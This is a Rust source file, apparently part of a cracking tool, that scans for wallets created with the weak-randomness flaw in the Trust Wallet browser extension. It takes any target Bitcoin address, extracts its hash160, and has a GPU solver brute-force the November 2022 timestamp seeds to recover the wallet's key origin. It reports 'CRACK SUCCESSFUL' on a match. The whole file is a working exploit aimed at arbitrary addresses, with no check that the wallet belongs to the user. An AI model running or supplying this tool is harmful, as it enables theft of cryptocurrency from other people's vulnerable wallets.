#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
use std::str::FromStr;
use tracing::{info, warn};

/// Trust Wallet Browser Extension Vulnerability — GPU Scanner
///
/// MT19937 PRNG seeded with a 32-bit Unix timestamp.
/// Vulnerable wallets were created in the window **2022-11-14 – 2022-11-23 UTC**.
///
/// Supported address types:
///   P2PKH  (1...)    — legacy, script 25 bytes, hash160 at bytes [3..23]
///   P2WPKH (bc1q...) — native SegWit, script 22 bytes, hash160 at bytes [2..22]
///
/// The GPU kernel receives the 20-byte hash160 and is agnostic to address type.
pub fn run(target: Option<String>) -> Result<()> {
    info!("Trust Wallet Vulnerability Scanner (100% GPU)");

    let target_addr_str = target
        .as_ref()
        .ok_or_else(|| anyhow::anyhow!("Target address required"))?;
    info!("Target Address: {}", target_addr_str);

    let address = bitcoin::Address::from_str(target_addr_str)?
        .require_network(bitcoin::Network::Bitcoin)?;
    let script = address.script_pubkey();
    let script_bytes = script.as_bytes();

    // Extract hash160 depending on address/script type.
    //
    // P2PKH (25 bytes):
    //   [0]  0x76  OP_DUP
    //   [1]  0xa9  OP_HASH160
    //   [2]  0x14  OP_PUSHBYTES_20
    //   [3..23]    <hash160>        ← extract here
    //   [23] 0x88  OP_EQUALVERIFY
    //   [24] 0xac  OP_CHECKSIG
    //
    // P2WPKH (22 bytes):
    //   [0]  0x00  OP_0
    //   [1]  0x14  OP_PUSHBYTES_20
    //   [2..22]    <hash160>        ← extract here
    let target_hash160: [u8; 20] = if script.is_p2pkh() {
        if script_bytes.len() != 25 {
            anyhow::bail!(
                "Invalid P2PKH script length: {} bytes (expected 25)",
                script_bytes.len()
            );
        }
        if script_bytes[0] != 0x76 || script_bytes[1] != 0xa9 || script_bytes[2] != 0x14 {
            anyhow::bail!("Malformed P2PKH script header");
        }
        script_bytes[3..23]
            .try_into()
            .expect("validated 25-byte P2PKH script")
    } else if script.is_p2wpkh() {
        if script_bytes.len() != 22 {
            anyhow::bail!(
                "Invalid P2WPKH script length: {} bytes (expected 22)",
                script_bytes.len()
            );
        }
        if script_bytes[0] != 0x00 || script_bytes[1] != 0x14 {
            anyhow::bail!("Malformed P2WPKH script header");
        }
        script_bytes[2..22]
            .try_into()
            .expect("validated 22-byte P2WPKH script")
    } else {
        anyhow::bail!(
            "Unsupported address type. \
             Only P2PKH (1...) and P2WPKH (bc1q...) are supported."
        );
    };

    info!("Target Hash160: {}", hex::encode(target_hash160));

    // Vulnerable window confirmed by Unciphered disclosure.
    let start_ts = 1_668_384_000u32; // 2022-11-14 00:00:00 UTC
    let end_ts = 1_669_247_999u32;   // 2022-11-23 23:59:59 UTC

    info!(
        "Scanning timestamps {} -> {} ({} seconds)...",
        start_ts,
        end_ts,
        end_ts - start_ts + 1,
    );

    #[cfg(not(feature = "gpu"))]
    {
        anyhow::bail!(
            "This scanner requires GPU acceleration. \
             Recompile with `--features gpu`."
        );
    }

    #[cfg(feature = "gpu")]
    {
        let start_time = std::time::Instant::now();
        let solver = GpuSolver::new()?;
        info!("[GPU] Solver initialised");

        let results = solver.compute_trust_wallet_crack(start_ts, end_ts, &target_hash160)?;

        if !results.is_empty() {
            warn!("\n[GPU] \u{1F513} CRACK SUCCESSFUL!");
            for timestamp in &results {
                warn!("  Found timestamp: {}", timestamp);
            }
        } else {
            info!("\nScan complete. No match found.");
        }

        info!(
            "Time elapsed: {:.2}s",
            start_time.elapsed().as_secs_f64()
        );
        Ok(())
    }
}
